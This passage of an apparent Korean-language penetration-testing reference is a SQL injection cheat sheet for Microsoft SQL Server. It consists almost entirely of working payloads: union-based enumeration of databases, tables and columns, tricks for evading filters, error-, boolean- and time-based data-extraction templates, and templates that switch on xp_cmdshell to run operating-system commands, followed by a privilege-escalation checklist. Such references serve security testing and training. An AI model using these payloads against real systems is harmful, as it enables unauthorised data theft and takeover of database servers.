' UNION SELECT NULL,@@version,NULL--
' AND 1=CONVERT(int,@@version)--  (에러 기반)

-- 사용자
' UNION SELECT NULL,SYSTEM_USER,NULL--

-- 데이터베이스
' UNION SELECT NULL,DB_NAME(),NULL--

-- 모든 DB
' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.databases--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--

-- 모든 테이블
' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.tables--
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--

-- 모든 컬럼
' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--
```

### 17.2 필터 우회 치트시트

```sql
-- Quote 우회
CHAR(97)+CHAR(100)+CHAR(109)  -- 'adm' (CHAR)
0x61646D696E                  -- 'admin' (Hex)

-- Space 우회
/**/                          -- 주석
%09, %0A, %0D                 -- 공백 문자
+                             -- 일부 상황

-- Keyword 우회
SeLeCt, SEL/**/ECT            -- Case, 주석
EXEC('SEL'+'ECT...')          -- 동적 SQL

-- = 우회
LIKE                          -- 비교 대체
<>                            -- 부정

-- Comment
--, /* */                     -- 주석 유형

-- Stacked Query
; {query};                    -- 기본 지원
```

### 17.3 데이터 추출 템플릿

```sql
-- Union-based 템플릿
' UNION SELECT NULL,{payload},NULL--

-- Error-based 템플릿
' AND 1=CONVERT(int,({payload}))--
' AND 1=CAST(({payload}) AS int)--

-- Boolean-based 템플릿
' AND ASCII(SUBSTRING(({payload}),{pos},1))>{mid}--

-- Time-based 템플릿
'; IF ASCII(SUBSTRING(({payload}),{pos},1))>{mid} WAITFOR DELAY '0:0:5'--

-- Stacked Query 템플릿
'; {query};--
```

### 17.4 명령 실행 템플릿

```sql
-- xp_cmdshell 활성화 + 실행
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '{command}';--

-- 간단 버전 (이미 활성화된 경우)
'; EXEC xp_cmdshell '{command}';--

-- 결과 저장
'; CREATE TABLE #r(o varchar(8000)); INSERT #r EXEC xp_cmdshell '{command}'; SELECT * FROM #r;--
```

### 17.5 권한 상승 체크리스트

```sql
-- 1. 권한 확인
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 2. xp_cmdshell 상태 확인
EXEC xp_cmdshell 'whoami';

-- 3. 활성화 시도
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 4. 대체 방법 시도
-- OLE Automation, SQL Agent, Linked Server 등
```

---

> **이전 문서**: 04_DBMS_PostgreSQL.md
> **다음 문서**: Knowledge Base 구축 (01_Knowledge_Base/)
